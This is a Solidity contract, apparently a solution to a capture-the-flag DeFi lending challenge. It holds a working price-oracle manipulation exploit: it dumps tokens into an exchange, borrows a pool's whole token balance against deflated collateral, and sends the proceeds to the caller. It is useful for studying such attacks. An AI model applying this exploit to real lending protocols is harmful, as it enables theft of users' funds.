// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPuppetPool {
    function calculateDepositRequired(uint256 amount)
        external
        view
        returns (uint256);

    function borrow(uint256 borrowAmount) external payable;
}

interface IUniswapExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline)
        external payable
        returns (uint256);
}
// Deprecated
contract PuppetAttack {
    IERC20 token;
    IPuppetPool pool;
    IUniswapExchange uniswap;

    constructor(
        IERC20 _token,
        IPuppetPool _pool,
        IUniswapExchange _uniswap
    ) {
        token = _token;
        pool = _pool;
        uniswap = _uniswap;
    }

    function attack(uint256 amount) public {
        token.approve(address(uniswap), amount);
        uniswap.tokenToEthSwapInput(amount, 1, block.timestamp * 2);
        pool.borrow{value: address(this).balance}(
            token.balanceOf(address(pool))
        );

        uniswap.ethToTokenSwapOutput{value: address(this).balance}(amount, block.timestamp * 2);
        token.transfer(msg.sender, token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
